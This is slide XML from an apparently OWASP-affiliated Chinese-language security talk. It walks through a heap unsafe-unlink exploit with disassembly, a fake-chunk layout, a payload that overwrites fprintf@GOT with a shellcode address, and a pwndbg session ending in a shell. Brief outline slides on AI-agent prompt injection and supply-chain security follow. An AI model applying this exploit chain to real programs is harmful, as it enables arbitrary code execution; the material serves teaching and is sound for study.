            <a:r>
              <a:rPr sz="2400" b="0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15</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2400" b="0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main</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai TW"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2014431101" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="6839330" y="952499"/>
            <a:ext cx="4843855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扣掉 UND（libc import），</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="24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自定義的全域符號</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="240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。</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai TW"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="509089458" name=""/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4"/>
          <a:srcRect l="0" t="70436" r="0" b="9968"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="583062" y="4296454"/>
            <a:ext cx="10972800" cy="1343704"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1461409491" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="6975401" y="4739527"/>
            <a:ext cx="3778323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從GOT裡面找覆寫目標</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai TW"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="706834324" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="648079" y="5834061"/>
            <a:ext cx="10853406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750015" lvl="1" indent="-349965">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="240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fprintf　-&gt; addr : 0x404010</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai T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572190" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="724817" y="11718"/>
            <a:ext cx="10750276" cy="685933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>
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/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malloc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401243:  mov    $0x90,%edi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401251:  call   malloc@plt        ; q = malloc(0x90)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40124c:  mov    $0x90,%edi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401251:  call   malloc@plt        ; r = malloc(0x90)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83878" indent="-283878">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="v"/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溢位點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　4012ce:  mov    $0x100,%edx       ; rdx = 0x100 </a:t>
            </a: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(256 bytes)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　4012db:  call  　read@plt         　 ; read(0, q, 0x100)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683928" lvl="1" indent="-283878">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/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q 只 malloc 0x90 (144 bytes)，</a:t>
            </a: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溢出 0x100 - 0x90 = 0x70 bytes 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lvl="1">
              <a:defRPr/>
            </a:pP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83878" indent="-283878">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="v"/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觸發點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　4012e7:  call   free@plt          ; free(r)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83878" indent="-283878">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="v"/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read(0, p+3, 8) 和 read(0, p, 8)   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　40134c:  call   read@plt          ; read(0, p+3, 8)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　 4013ad:  call   read@plt          ; read(0, p, 8)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83878" indent="-283878">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="v"/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最後一個 fprintf  -&gt;  </a:t>
            </a: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觸發</a:t>
            </a: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GOT hijack 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　4013d0:  call   fprintf@plt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779357580" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="8829374" y="238124"/>
            <a:ext cx="2953568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rgbClr val="FFC000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>objdump</a:t>
            </a:r>
            <a:endParaRPr sz="3600" b="1"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55978375" name=""/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" t="48115" r="31754" b="9474"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="1034822" y="136071"/>
            <a:ext cx="10028313" cy="3895044"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="983774010" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="1158347" y="4507365"/>
            <a:ext cx="9929525" cy="179297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0x405000       metadata / top chunk 起頭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0x405290       chunk Q header      -&gt;  { prev_size, size }  size=0xa1 (PREV_INUSE)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0x4052a0       chunk Q data          -&gt;   shellcode 放這裡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0x405330       chunk R header      -&gt;  { prev_size, size }  size=0xa1</a:t>
            </a:r>
            <a:endParaRPr sz="22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2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0x405340       chunk R data</a:t>
            </a:r>
            <a:endParaRPr sz="22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595730" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="412972" y="6332"/>
            <a:ext cx="10515600" cy="1325560"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Unsafe Unlink 原理</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="383495205" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="375936" y="1241650"/>
            <a:ext cx="11427660" cy="497180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727985" lvl="1" indent="-327935">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/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p = q - 10 = 0x4052a0 - 0x10 = 0x405290</a:t>
            </a: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727986" lvl="1" indent="-327936">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/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chunk Q data  (0x4052a0)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="24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lvl="1"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 +0x00  fd  = &amp;p - 0x18 = 0x404078   ← 假的 fd</a:t>
            </a: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lvl="1"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 +0x08  bk  = &amp;p - 0x10 = 0x404080   ← 假的 bk</a:t>
            </a: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lvl="1"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 +0x10..       NOP / shellcode</a:t>
            </a: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DEP:</a:t>
            </a:r>
            <a:endParaRPr sz="240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49965" indent="-349965">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="v"/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if (FD-&gt;bk != Q || BK-&gt;fd != Q)  → 直接 abort</a:t>
            </a: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49965" indent="-349965">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/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FD-&gt;bk = *(FD+0x18) = *(&amp;p)      = p 原本的值 = Q 的位址 ✓</a:t>
            </a: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49965" indent="-349965">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/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BK-&gt;fd = *(BK+0x10) = *(&amp;p)      = Q 的位址 ✓</a:t>
            </a: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27936" indent="-327936">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/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*(FD+0x18) = *(0x404078+0x18) = *(0x404090) = p 的值 = 0x405290 (Q) ✓</a:t>
            </a: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27936" indent="-327936">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/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*(BK+0x10) = *(0x404080+0x10) = *(0x404090) = p 的值 = 0x405290 (Q) ✓</a:t>
            </a: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766053" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="583062" y="-44694"/>
            <a:ext cx="10515600" cy="1325560"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW" sz="4400" b="1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Unsafe Unlink 原理</a:t>
            </a:r>
            <a:endParaRPr sz="4400"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1683231561" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="426963" y="986517"/>
            <a:ext cx="11669925" cy="5578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FD = Q-&gt;fd         ; FD = 0x404078</a:t>
            </a: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BK = Q-&gt;bk         ; BK = 0x404080</a:t>
            </a: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FD-&gt;bk = BK        ; *(0x404078 + 0x18) = BK</a:t>
            </a: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                  ; *(0x404090) = BK = 0x404080</a:t>
            </a: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BK-&gt;fd = FD        ; *(0x404080 + 0x10) = FD</a:t>
            </a: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                  ; *(0x404090) = FD = 0x404078</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="24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>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="240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49965" indent="-349965">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="v"/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jmp: 0x5 bytes, </a:t>
            </a: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nop: 0x14 bytes,</a:t>
            </a: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execve("/bin/sh",0,0): 0x1 byte</a:t>
            </a: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750015" lvl="1" indent="-349965">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/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shellcode 起點</a:t>
            </a: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: 0x4052a0 + 0x20 = 0x4052c0</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="24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lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="240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read(0, p+3, 8)   -&gt; p+3 是 long long 指標 (8 =</a:t>
            </a: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uint64_t*</a:t>
            </a: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)</a:t>
            </a:r>
            <a:endParaRPr sz="24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                 -&gt; 位址 = p + 24 = 0x404078+0x18 = &amp;p</a:t>
            </a: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                 -&gt; 送 p64(0x404010) → p 被改成 fprintf@GOT</a:t>
            </a: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read(0, p, 8)     -&gt; 位址 = 0x404010 = fprintf@GOT</a:t>
            </a:r>
            <a:endParaRPr sz="24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r>
              <a:rPr lang="zh-TW" sz="24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                 -&gt; 送 p64(shellcode位址) → fprintf@GOT = shellcode</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="240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 addr</a:t>
            </a:r>
            <a:endParaRPr sz="240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</p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="521184575" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="2365981" y="2228169"/>
            <a:ext cx="8232321" cy="221116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55627642" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="2723169" y="2347232"/>
            <a:ext cx="7694515" cy="1638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TW" sz="20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p_addr   = 0x404090                 # &amp;p</a:t>
            </a:r>
            <a:endParaRPr sz="2000" b="1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20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got         = 0x404010                 # fprintf@GOT ：覆寫位</a:t>
            </a:r>
            <a:endParaRPr sz="2000" b="1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20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sc_addr  = 0x4052a0 + 0x20     # shellcode 位址</a:t>
            </a:r>
            <a:endParaRPr sz="2000" b="1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000" b="1"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW" sz="2000" b="1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payload = stage1.ljust(0x100, b'\x00') + p64(got) + p64(sc_addr)</a:t>
            </a:r>
            <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="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184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62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611487" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="426962" y="204106"/>
            <a:ext cx="11054636" cy="62080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zh-TW" sz="1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pwndbg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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set disable-randomization on</a:t>
            </a:r>
            <a:endParaRPr sz="18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pwndbg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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break *0x4012db         -&gt; read(0,q,0x100) 之前停</a:t>
            </a:r>
            <a:endParaRPr sz="18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pwndbg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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run &lt; /tmp/input.bin    -&gt;  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" spc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</a:rPr>
              <a:t>餵 payload 檔（Fake Chunk）</a:t>
            </a:r>
            <a:endParaRPr sz="18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pwndbg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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x/1gx 0x404090           -&gt; &amp;p</a:t>
            </a:r>
            <a:endParaRPr sz="18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0x404090 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" spc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/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
              </a:rPr>
              <a:t>&lt;p&gt;:   0x0000000000405290     -&gt; p 目前指向 Q header</a:t>
            </a:r>
            <a:endParaRPr sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr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sz="18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pwndbg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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x/1gx 0x404010            -&gt; fprintf</a:t>
            </a:r>
            <a:endParaRPr sz="18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0x404010 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="1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&lt;fprintf@got[plt]&gt;: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="1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0x00007ffff7c5f560   -&gt; GOT 還沒被改</a:t>
            </a:r>
            <a:endParaRPr sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:srgbClr val="00B0F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1800" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:srgbClr val="00B0F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pwndbg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0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zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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break *0x4012ec         -&gt;  free(r) 之後 (0x4012e7)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="1800" b="0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zh-TW" sz="1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pwndbg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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continue</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="18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pwndbg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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x/1gx 0x404090</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="18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0x404090</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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zh-TW" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" spc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/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
              </a:rPr>
              <a:t>&lt;p&gt;:   0x0000000000404078     -&gt;  p 被改成 &amp;p-0x18！</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" spc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/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
              </a:rPr>
              <a:t>unsafe unlink 成功！</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="18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zh-TW" sz="18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pwndbg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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break *0x4013b2         -&gt;  第三次 read 後</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="18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pwndbg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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continue                  </a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="18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pwndbg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0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zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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x/1gx 0x404010            -&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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fprintf</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="18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0x404010 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="1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&lt;fprintf@got[plt]&gt;: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
              </a:rPr>
              <a:t>0x00000000004052c0    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" spc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✓ GOT hijack ！</a:t>
            </a:r>
            <a:endParaRPr sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0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lang="zh-TW" sz="18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800" b="1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pwndbg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="1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continue</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="18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zh-TW" sz="1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uid=1000(antiphase-047) gid=1000(antiphase-047) </a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1570703742" name=""/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="1">
            <a:off x="426963" y="1275669"/>
            <a:ext cx="1068160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03290" name=""/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="1">
            <a:off x="477310" y="2856818"/>
            <a:ext cx="1068160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467149" name=""/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="1">
            <a:off x="477310" y="5696629"/>
            <a:ext cx="10681606" cy="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1400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668579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OWASP in Vancouver</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1988540817" name="Subtitle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto"/>
        <p:txBody>
          <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" wrap="square" lIns="91440" tIns="274317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zh-TW" sz="3600" b="0" i="0" u="none" strike="noStrike" cap="none" spc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AI Agent – prompt injection</a:t>
            </a:r>
            <a:endParaRPr sz="3600"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3600"/>
              <a:t>Supply Chain Security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042437" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="884660" y="202143"/>
            <a:ext cx="10515600" cy="1325560"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/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TW" sz="4400" b="1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二 . AI Agent – Prompt Injection</a:t>
            </a:r>
            <a:endParaRPr sz="4400" b="1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</p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1361402519" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="884660" y="3252438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684881072" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="884660" y="1688705"/>
            <a:ext cx="10866538" cy="4846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71994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="v"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2600" b="1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被動權　-&gt; 主動權</a:t>
            </a:r>
            <a:endParaRPr sz="2600" b="1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>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="260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772044" lvl="1" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="w"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="260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前期 AI :</a:t>
            </a:r>
            <a:endParaRPr sz="260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1172094" lvl="2" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="260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工程人員下 prompt / 指令，AI 負責</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2600" b="1">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:latin typeface="AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t>執行</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="260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。</a:t>
            </a:r>
            <a:endParaRPr sz="260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lvl="2">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="260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772044" lvl="1" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="w"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="260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當前 AI :</a:t>
            </a:r>
            <a:endParaRPr sz="260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1172094" lvl="2" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="260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Agent 的出現實現自動化工作流，使 AI 有</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2600">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:latin typeface="AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t>主動行動</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="260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的能力。</a:t>
            </a:r>
            <a:endParaRPr sz="260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1172094" lvl="2" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pP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根據</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="2600" b="0" i="0" u="sng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環境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反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饋</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:latin typeface="AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t>自主決定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下一個行動步驟。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="2600" b="0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1172094" lvl="2" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pP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讀取外部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資料庫、解析使用者檔案、呼叫 API、執行系統指令。</a:t>
            </a:r>
            <a:endParaRPr sz="26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endParaRPr lang="zh-TW" sz="26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371994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="v"/>
              <a:defRPr/>
            </a:pP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指令注入（Prompt Injection）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="26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 marL="1172094" lvl="2" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="260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</p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="777138849" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="1280121" y="1267521"/>
            <a:ext cx="1081685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960164" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="787169" y="227449"/>
            <a:ext cx="10515600" cy="1325560"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/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TW" sz="4400" b="1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ㄧ .  Supply Chain Security</a:t>
            </a:r>
            <a:endParaRPr sz="4400">
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai TW"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="407446280" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="1124330" y="1581830"/>
            <a:ext cx="10427286" cy="36579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71994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pP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依賴開源套件、第三方函式庫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、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外部雲端服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務元件。</a:t>
            </a:r>
            <a:endParaRPr sz="26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 marL="772044" lvl="1" indent="-371994">
